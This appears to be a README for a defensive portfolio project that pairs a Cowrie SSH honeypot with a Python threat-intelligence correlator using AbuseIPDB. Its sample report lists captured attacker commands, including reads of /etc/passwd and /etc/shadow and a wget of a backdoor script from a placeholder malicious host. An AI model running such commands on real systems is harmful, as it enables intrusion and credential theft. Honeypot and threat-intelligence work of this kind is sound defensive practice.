# Honeypot + Threat Intelligence Platform

An SSH honeypot that captures attacker behavior, paired with a threat intelligence correlator that enriches attacker data with external reputation feeds.

## Architecture
```
Attacker → Cowrie Honeypot (port 2222) → JSON Logs → Correlator → Threat Report
                                                          ↓
                                                     AbuseIPDB API
```

## Components

### Cowrie SSH Honeypot
- Simulates a real Linux SSH server that accepts attacker logins
- Records all credentials attempted, commands typed, and files downloaded
- Logs everything in structured JSON for automated analysis

### Threat Intelligence Correlator
- Parses Cowrie's JSON logs and groups activity by attacker IP
- Queries AbuseIPDB API for IP reputation data (abuse score, country, ISP, report count)
- Aggregates credential statistics to identify trending attack patterns
- Generates color-coded terminal reports and JSON exports

## Detections & Data Captured

- Login attempts (usernames, passwords, success/failure)
- Post-login commands (system recon, malware downloads, persistence attempts)
- SSH client fingerprinting (distinguishes automated bots from human attackers)
- File download URLs (malware IOCs)
- Session metadata (timing, duration, source IP)

## Sample Output
```
============================================================
  HONEYPOT THREAT INTELLIGENCE REPORT
============================================================
  Unique Attackers:   1
  Total Sessions:     9
  Login Attempts:     10
  Commands Executed:  22

  ── Top Usernames Attempted ──
    root                    7  ███████
    admin                   3  ███

  ── Attacker Profiles ──
  IP: 192.168.64.6
  Sessions: 9
  SSH client: SSH-2.0-OpenSSH_9.6p1, SSH-2.0-libssh_0.10.6
  Abuse Score: 0/100 (LOW RISK)
  Commands:
    > whoami
    > cat /etc/passwd
    > wget http://evil-malware-site.com/backdoor.sh
    > cat /etc/shadow
```

## Requirements

- Python 3
- Cowrie SSH Honeypot
- AbuseIPDB API key (free at https://www.abuseipdb.com)

## Usage

Start the honeypot (as cowrie user):
```bash
source ~/cowrie/cowrie-env/bin/activate
cowrie start
```

Run the correlator:
```bash
python3 correlator.py
```

## Skills Demonstrated

- Honeypot deployment and deception technology
- Threat intelligence integration (AbuseIPDB API)
- IOC collection and correlation
- Attacker behavior analysis
- SSH client fingerprinting (HASSH)